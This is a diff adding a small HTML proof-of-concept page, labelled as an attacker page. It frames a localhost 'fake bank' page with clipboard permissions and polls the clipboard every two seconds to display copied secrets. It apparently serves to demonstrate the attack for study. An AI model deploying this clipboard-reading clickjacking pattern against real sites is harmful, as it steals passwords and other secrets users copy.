@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html>
+	<style>
+		iframe {
+			top: 200px;
+			width: 2000px;
+			height: 2000px;
+			position: absolute;
+		}
+	</style>
+	<body>
+		<h1>Parent Clickjacking (Attacker page)</h1>
+		<div id="intro">
+			In this example page I assume this page is the attacker and we add the iframe of the bank with some kind of secret.
+			This parent page will read the clipboard to reveal the secret if you copy to the clipboard.
+		</div>
+		<div id="read-clipboard">
+                        In this section, the webpage reads the clipboard for each 2 seconds printing the copied text in the bottom. Copied text: 
+                        <p id="paste"></p>
+                </div>
+
+		<iframe src="http://localhost:1234/iframes/iframe-clickjacking/fake-bank.html" allow="clipboard-read; clipboard-write" ></iframe>
+                <script>
+                        // Set listener to see what's in the clipboard
+                        var read = 0;
+                        function checkClipboard(){
+                                // Set listener to copy
+                                navigator.clipboard.readText().then( (clipText) => {
+                                        console.log(clipText);
+                                        text = `Time ${read}, text: ${clipText}.\n` 
+                                        document.querySelector("#paste").innerText += text
+                                        read += 1;
+                                });
+                        }
+                        setInterval(checkClipboard, 2000)
+                </script>
+
+	</body>
+</html>
